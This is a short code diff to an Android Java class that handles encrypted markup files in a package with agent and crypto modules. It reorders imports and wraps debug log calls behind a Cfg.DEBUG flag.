@@ -16,16 +16,16 @@ import java.io.ObjectInput;
 import java.io.ObjectInputStream;
 import java.io.ObjectOutput;
 import java.io.ObjectOutputStream;
-
 import java.io.Serializable;
 
 import android.util.Log;
 
 import com.android.service.agent.AgentType;
-import com.android.service.event.EventType;
+import com.android.service.auto.Cfg;
 import com.android.service.crypto.CryptoException;
 import com.android.service.crypto.Encryption;
 import com.android.service.crypto.Keys;
+import com.android.service.event.EventType;
 import com.android.service.file.AutoFile;
 import com.android.service.file.Path;
 import com.android.service.util.Check;
@@ -156,7 +156,7 @@ public class Markup {
 			if (removeMarkup(type.name())) {
 				numDeleted++;
 			} else {
-				Log.d("QZ", TAG + " Error (removeMarkups): " + type);
+				if(Cfg.DEBUG) Log.d("QZ", TAG + " Error (removeMarkups): " + type);
 			}
 		}
 
@@ -164,7 +164,7 @@ public class Markup {
 			if (removeMarkup(type.name())) {
 				numDeleted++;
 			} else {
-				Log.d("QZ", TAG + " Error (removeMarkups): " + type);
+				if(Cfg.DEBUG) Log.d("QZ", TAG + " Error (removeMarkups): " + type);
 			}
 		}
 
@@ -221,7 +221,7 @@ public class Markup {
 
 			return plain;
 		} else {
-			Log.d("QZ", TAG
+			if(Cfg.DEBUG) Log.d("QZ", TAG
 					+ " Error (readMarkup): Markup file does not exists");
 			return null;
 		}
@@ -296,7 +296,7 @@ public class Markup {
 			Object o = in.readObject();
 			return o;
 		} catch (ClassNotFoundException e) {
-			Log.d("QZ", TAG + " Error (readMarkupSerializable): " + e);
+			if(Cfg.DEBUG) Log.d("QZ", TAG + " Error (readMarkupSerializable): " + e);
 			throw new IOException();
 		}
 	}
